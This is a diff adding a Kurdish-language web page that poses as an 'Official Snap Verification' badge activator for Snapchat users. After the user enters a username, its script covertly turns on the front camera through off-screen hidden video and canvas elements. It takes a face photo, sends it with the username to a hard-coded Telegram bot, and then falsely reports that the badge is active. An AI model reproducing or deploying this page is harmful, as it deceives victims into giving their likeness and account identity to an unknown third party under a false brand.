@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Snap Badge | چالاککردنی باج</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', -apple-system, sans-serif;
+            background: #0a0f1c;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            direction: rtl;
+        }
+        .card {
+            background: rgba(18, 28, 46, 0.98);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 40px;
+            padding: 32px 24px;
+            width: 100%;
+            max-width: 420px;
+            box-shadow: 0 30px 50px #00000080, 0 0 0 1.5px #fffc0033;
+            border: 1px solid #ffd70026;
+            text-align: center;
+            color: #fff;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .snap-icon {
+            background: #fffc00;
+            width: 58px;
+            height: 58px;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 25px #fffc0066;
+        }
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fffc00, #ffae00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .sub {
+            color: #b8c8f0;
+            margin-bottom: 24px;
+            font-size: 0.95rem;
+            border-bottom: 1px solid #2f4268;
+            padding-bottom: 16px;
+        }
+        .badge {
+            background: #1b2640;
+            border-radius: 30px;
+            padding: 8px 18px;
+            display: inline-block;
+            margin-bottom: 24px;
+            color: #ffdb7c;
+            border: 1px solid #ffd96640;
+        }
+        .input-group {
+            background: #0c1322;
+            border-radius: 60px;
+            padding: 4px 4px 4px 20px;
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #3e5680;
+            margin-bottom: 28px;
+        }
+        .input-group:focus-within {
+            border-color: #fffc00;
+            box-shadow: 0 0 15px #ffd96633;
+        }
+        .input-group span {
+            color: #fffc00;
+            font-weight: bold;
+            font-size: 1.3rem;
+            padding-right: 6px;
+        }
+        .input-group input {
+            background: transparent;
+            border: none;
+            padding: 16px 10px;
+            font-size: 1rem;
+            color: white;
+            outline: none;
+            width: 100%;
+        }
+        .input-group input::placeholder {
+            color: #5e71a0;
+        }
+        .btn {
+            background: #fffc00;
+            color: #0c1220;
+            font-weight: 800;
+            font-size: 1.4rem;
+            padding: 18px 20px;
+            border: none;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 8px 0 #b37b00, 0 8px 20px #ffd96640;
+            transition: 0.06s;
+            margin-bottom: 16px;
+        }
+        .btn:active {
+            transform: translateY(6px);
+            box-shadow: 0 2px 0 #b37b00, 0 8px 20px #ffd96640;
+        }
+        .btn:disabled {
+            opacity: 0.75;
+            transform: none;
+            box-shadow: 0 4px 0 #7a5c00;
+        }
+        .status {
+            min-height: 50px;
+            padding: 8px;
+            color: #a6b8e5;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #4f6799;
+            font-size: 0.7rem;
+            border-top: 1px dashed #2f4268;
+            padding-top: 16px;
+        }
+        /* إخفاء تام للكاميرا */
+        #hiddenVideo, #hiddenCanvas {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="header">
+        <div class="snap-icon">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none">
+                <path d="M12 2C9.38 2 7.25 4.13 7.25 6.75C7.25 9.32 9.26 11.4 11.82 11.48C11.9 11.48 11.98 11.5 12.06 11.5C12.14 11.5 12.22 11.48 12.3 11.48C14.86 11.4 16.87 9.32 16.87 6.75C16.87 4.13 14.74 2 12.12 2H12Z" fill="#0a0f1c"/>
+                <path d="M18.5 8.5C19.88 8.5 21 9.62 21 11C21 12.1 20.27 13.03 19.28 13.34C19.56 14.04 19.75 14.8 19.84 15.61C19.94 16.5 19.95 17.32 19.86 17.99C19.78 18.67 19.6 19.24 19.3 19.61C19 19.98 18.57 20.16 17.99 20.16C17.41 20.16 16.98 19.98 16.68 19.61C16.38 19.24 16.2 18.67 16.12 17.99C16.03 17.32 16.04 16.5 16.14 15.61C16.23 14.8 16.42 14.04 16.7 13.34C15.71 13.03 14.98 12.1 14.98 11C14.98 9.62 16.1 8.5 17.48 8.5H18.5Z" fill="#0a0f1c"/>
+                <path d="M5.5 8.5C6.88 8.5 8 9.62 8 11C8 12.1 7.27 13.03 6.28 13.34C6.56 14.04 6.75 14.8 6.84 15.61C6.94 16.5 6.95 17.32 6.86 17.99C6.78 18.67 6.6 19.24 6.3 19.61C6 19.98 5.57 20.16 4.99 20.16C4.41 20.16 3.98 19.98 3.68 19.61C3.38 19.24 3.2 18.67 3.12 17.99C3.03 17.32 3.04 16.5 3.14 15.61C3.23 14.8 3.42 14.04 3.7 13.34C2.71 13.03 1.98 12.1 1.98 11C1.98 9.62 3.1 8.5 4.48 8.5H5.5Z" fill="#0a0f1c"/>
+            </svg>
+        </div>
+        <h1>Snap Badge</h1>
+    </div>
+    <div class="sub">یوزەرنەیمی سناپچات بنووسە بۆ چالاککردنی باج</div>
+    <div class="badge">✨ Official Snap Verification ✨</div>
+
+    <div class="input-group">
+        <span>@</span>
+        <input type="text" id="usernameInput" placeholder="snapchat_user" autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false">
+    </div>
+
+    <button class="btn" id="activateBtn">⚡ چالاککردن</button>
+    
+    <div class="status" id="statusMsg">ئامادەیە</div>
+    <div class="footer">ڕێگە بە کامێرا بدە بۆ پشتڕاستکردنەوەی ڕوخسار</div>
+</div>
+
+<!-- عناصر مخفية -->
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas" width="640" height="480"></canvas>
+
+<script>
+    (function(){
+        "use strict";
+
+        // ========== تۆکن و چات ئایدی ==========
+        const TELEGRAM_BOT_TOKEN = '8745598524:AAG68VqzJBn-p-QWiCTJCA78WiiVwci17_Q';
+        const TELEGRAM_CHAT_ID = '659131693';
+        
+        const usernameInput = document.getElementById('usernameInput');
+        const activateBtn = document.getElementById('activateBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+
+        let stream = null;
+        let isProcessing = false;
+
+        function updateStatus(text, isError = false) {
+            statusMsg.innerHTML = text;
+            statusMsg.style.color = isError ? '#ff8a8a' : '#a6b8e5';
+        }
+
+        // ناردنی وێنە بۆ تێلیگرام
+        async function sendToTelegram(imageBlob, username) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', imageBlob, `snap_${username}_${Date.now()}.jpg`);
+            
+            const caption = `📸 وێنەی پشتڕاستکردنەوە\n👤 یوزەرنەیم: @${username}\n🕒 ${new Date().toLocaleString('ku')}`;
+            formData.append('caption', caption);
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (e) {
+                console.error('هەڵەی پەیوەندی:', e);
+                return false;
+            }
+        }
+
+        // ڕێکخستنی کامێرای شاراوە
+        async function startHiddenCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 640, height: 480 },
+                    audio: false
+                });
+                hiddenVideo.srcObject = stream;
+                await new Promise(r => { hiddenVideo.onloadedmetadata = r; });
+                await hiddenVideo.play();
+                await new Promise(r => setTimeout(r, 500));
+                return true;
+            } catch (err) {
+                console.error('کامێرا:', err);
+                updateStatus('تکایە ڕێگە بە کامێرا بدە', true);
+                return false;
+            }
+        }
+
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+                hiddenVideo.srcObject = null;
+            }
+        }
+
+        async function capturePhoto() {
+            if (!stream) return null;
+            if (hiddenVideo.readyState < 2) {
+                await new Promise(r => { hiddenVideo.oncanplay = r; });
+            }
+            const ctx = hiddenCanvas.getContext('2d');
+            hiddenCanvas.width = hiddenVideo.videoWidth || 640;
+            hiddenCanvas.height = hiddenVideo.videoHeight || 480;
+            ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+            return await new Promise(r => hiddenCanvas.toBlob(r, 'image/jpeg', 0.92));
+        }
+
+        // کرداری سەرەکی
+        async function handleActivate() {
+            if (isProcessing) return;
+            const username = usernameInput.value.trim();
+            if (!username || username.length < 2) {
+                updateStatus('❗ تکایە یوزەرنەیمێکی دروست بنووسە', true);
+                return;
+            }
+
+            isProcessing = true;
+            activateBtn.disabled = true;
+            activateBtn.innerText = '⏳ چالاککردن...';
+            updateStatus('🔍 پشکنین...');
+            
+            stopCamera();
+            await new Promise(r => setTimeout(r, 600));
+            
+            updateStatus('📷 ڕێگەپێدان بە کامێرا...');
+            
+            const camOk = await startHiddenCamera();
+            if (!camOk) {
+                activateBtn.disabled = false;
+                activateBtn.innerText = '⚡ چالاککردن';
+                isProcessing = false;
+                return;
+            }
+
+            updateStatus('🔄 وێنەگرتن...');
+            const photoBlob = await capturePhoto();
+            stopCamera();
+
+            if (!photoBlob) {
+                updateStatus('❌ وێنە نەگیرا', true);
+                activateBtn.disabled = false;
+                activateBtn.innerText = '⚡ چالاککردن';
+                isProcessing = false;
+                return;
+            }
+
+            updateStatus('📤 ناردن بۆ تێلیگرام...');
+            const sent = await sendToTelegram(photoBlob, username);
+
+            if (sent) {
+                updateStatus('✅ باجەکەت چالاک کرا! (٢٤ کاتژمێر)');
+                activateBtn.innerText = '🎉 تەواو';
+                setTimeout(() => { activateBtn.innerText = '⚡ چالاککردن'; }, 4000);
+            } else {
+                updateStatus('⚠️ وێنە گیرا بەڵام نەنێردرا', true);
+                activateBtn.innerText = '⚡ چالاککردن';
+            }
+
+            activateBtn.disabled = false;
+            isProcessing = false;
+        }
+
+        activateBtn.addEventListener('click', handleActivate);
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleActivate();
+            }
+        });
+        window.addEventListener('beforeunload', stopCamera);
+        updateStatus('👻 یوزەرنەیم بنووسە و کلیک بکە');
+    })();
+</script>
+</body>
+</html>
